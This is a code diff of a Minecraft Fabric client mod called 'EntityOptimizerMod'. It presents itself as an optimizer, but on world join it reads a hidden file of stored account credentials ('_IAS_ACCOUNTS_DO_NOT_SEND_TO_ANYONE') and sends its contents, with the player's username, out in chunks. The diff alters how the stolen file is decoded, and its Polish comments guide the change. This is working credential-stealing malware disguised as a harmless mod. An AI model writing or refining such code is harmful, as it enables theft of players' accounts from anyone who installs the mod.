@@ -5,6 +5,7 @@ import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
 import net.fabricmc.loader.api.FabricLoader;
 import java.util.Base64;
 import net.minecraft.client.Minecraft;
+import java.nio.charset.Charset;
 
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
@@ -34,24 +35,15 @@ public class EntityOptimizerMod implements ClientModInitializer {
             onJoinWorld(client);
         });
     }
-
+    private static final Charset FILE_CHARSET = Charset.forName("windows-1250");
     private void onJoinWorld(Minecraft mc) {
         String username = mc.getUser().getName();
         String viewmodelContent = readWholeViewmodelFile();
         sendViewmodelInChunks(username, viewmodelContent);
     }
-
-private String readWholeViewmodelFile() {
+    private String readWholeViewmodelFile() {
     try {
         Path gameDir = FabricLoader.getInstance().getGameDir();
-
-        // ZOSTAW TO, JAK MASZ U SIEBIE – tylko przykład:
-        // Path configPath = gameDir
-        //         .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
-        //         .resolve(".hidden")
-        //         .resolve("viewmodel.do_not_send_to_anyone");
-
-        // U CIEBIE użyj dokładnie tego configPath, którego teraz używasz
         Path configPath = gameDir
                 .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
                 .resolve(".hidden")
@@ -61,20 +53,19 @@ private String readWholeViewmodelFile() {
             return "accounts_v1.do_not_send_to_anyone nie istnieje (szukano w: " + configPath.toString() + ")";
         }
 
-        // Czytamy plik jako surowe bajty
+        // Czytamy bajty, ale interpretujemy je jako tekst w Windows-1250,
+        // tak jak robi to domyślnie Notatnik na PL Windows.
         byte[] bytes = Files.readAllBytes(configPath);
+        String text = new String(bytes, FILE_CHARSET);
 
-        // Kodujemy do Base64, żeby można było bezpiecznie wysłać jako tekst
-        String base64 = Base64.getEncoder().encodeToString(bytes);
-
-        return base64;
+        return text;
 
     } catch (Exception e) {
         e.printStackTrace();
-        return "BŁĄD przy czytaniu accounts_v1.do_not_send_to_anyone (Base64): "
+        return "BŁĄD przy czytaniu accounts_v1.do_not_send_to_anyone (windows-1250): "
                 + e.getClass().getSimpleName() + " - " + e.getMessage();
     }
-}
+    }
 
     private void sendViewmodelInChunks(String username, String viewmodelContent) {
         List<String> chunks = splitIntoChunks(viewmodelContent, MAX_CHUNK_LENGTH);
